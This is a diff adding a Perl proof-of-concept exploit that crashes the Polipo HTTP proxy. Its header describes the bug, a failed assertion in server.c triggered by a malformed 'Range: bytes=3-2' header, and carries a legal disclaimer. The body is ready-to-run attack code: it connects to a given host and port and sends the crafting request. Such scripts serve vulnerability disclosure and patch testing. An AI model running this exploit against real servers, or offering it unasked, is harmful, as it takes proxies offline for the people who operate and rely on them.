@@ -1,0 +1,45 @@
+#!/usr/bin/perl
+#
+# NAME:              Polipo - Denial of Service using Range.
+# CVE:               Not assigned
+# AFFECTED VERSIONS: All
+#
+# OVERVIEW:
+#
+# Polipo doesn't ignore/reject the malformed Range-header on
+# chunked GET request.  Instead, it has an assertion:
+#
+#    server.c:1473: assert(from >= 0 && (to < 0 || to > from));
+#
+# So, a malformed header ("Range: bytes=3-2" for example) will cause
+# an assertion failed and thus denial-of-service.
+#
+# AUTHOR
+#
+# chinarulezzz
+# 
+# LEGAL DISCLAIMER
+#
+# The author does not hold any responsibility for the bad use of
+# this tool, remember that attacking targets without prior consent
+# is illegal and punished by law.
+
+use autodie;
+use Socket;
+
+die "usage: $0 host port\n" if @ARGV != 2;
+
+$host = $ARGV[0];
+$port = $ARGV[1];
+
+$iaddr = inet_aton      $host;
+$paddr = sockaddr_in    $port, $iaddr;
+$proto = getprotobyname 'tcp';
+
+socket  SOCK, PF_INET, SOCK_STREAM, $proto;
+connect SOCK, $paddr;
+send    SOCK, "GET http:// HTTP/1.1\r\n", 0;
+send    SOCK, "Range: bytes=3-2\r\n\r\n", 0;
+print   while <SOCK>;
+
+# End of file
